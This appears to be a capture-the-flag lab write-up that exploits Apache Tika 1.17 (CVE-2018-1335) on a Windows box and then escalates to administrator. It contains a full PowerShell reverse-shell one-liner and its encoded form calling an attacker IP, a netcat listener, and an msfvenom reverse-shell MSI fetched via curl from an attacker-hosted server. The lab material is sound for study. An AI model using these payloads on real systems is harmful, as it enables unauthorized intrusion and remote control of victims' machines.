# In this room, we are looking at a web server that will eventually provide us with a Windows shell.

First thing is to do some recon using nmap, which hopefully will provide us with some open ports
```bash
nmap -A <roomip>
```
Then we visit the site, and we see that it is a website that pulls metadata from images.

<img width="768" height="331" alt="image" src="https://github.com/user-attachments/assets/4ed714a4-2494-49bb-af13-a970b983a38f" />


Upon viewing the page source, we found some interesting information where the web server is performing a PUT on a specific port. Upon close observation, we found that the port has some services running on it.

<img width="365" height="166" alt="Screenshot From 2025-08-19 00-37-25" src="https://github.com/user-attachments/assets/58926f24-fcd5-46f8-996d-9e976eb4301d" />

When I visited the site, I found

<img width="768" height="192" alt="image" src="https://github.com/user-attachments/assets/d1e3f7db-2eb8-4a35-bf64-80aaabdef4e7" />

At this point, I had to search for the service running on port 61777, which is Apache Tika 1.17.

<img width="730" height="692" alt="Screenshot From 2025-08-19 00-40-39" src="https://github.com/user-attachments/assets/0f996643-831b-42a7-b566-ccbbf68077fb" />

On the [rhinosecuritylabs](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2018-1335)page, I found a script that would assist in gaining the shell. I modified the script and then ran it, and I had the shell.

First, performed some URL encoding in order to run the script
```bash
echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.9.8.195",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}' \ 
| iconv -t UTF-16LE | base64 -w 0
```
Then set the listener `nc -nlvp <listerner>`

After that, I run the script 
```bash
python3 cve2018.py cyberlens.thm 61777 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOQAuADgALgAxADkANQAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9AA=="
```

Upon gaining the shell, I can move through the Windows machine and see the content in the user.txt by navigating to the directory where users are, and then CyberLens Desktop.

From there, we can't access the admin unless we create a malicious payload that will give us a shell with root privileges. We shall use `msvenom` for that.
```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.8.195 LPORT=4444 -a x64 --platform Windows -f msi -o rev.msi
```
Then deliver the payload to our victim using curl.
```bash
#before running the command, first set a Python webserver in the same directory where the payload is, using this command.

python3 -m http.server 8000

curl http://10.9.8.195:8000/rev.msi -o rev.msi

#After that, set the listener on the attacker's machine and run ``./rev.msi`` on he victim's shell, and boom, we have a shell that has the admin capability.
```
After navigating to the admin users/administrator/desktop, run `type admin.txt` for the flag.







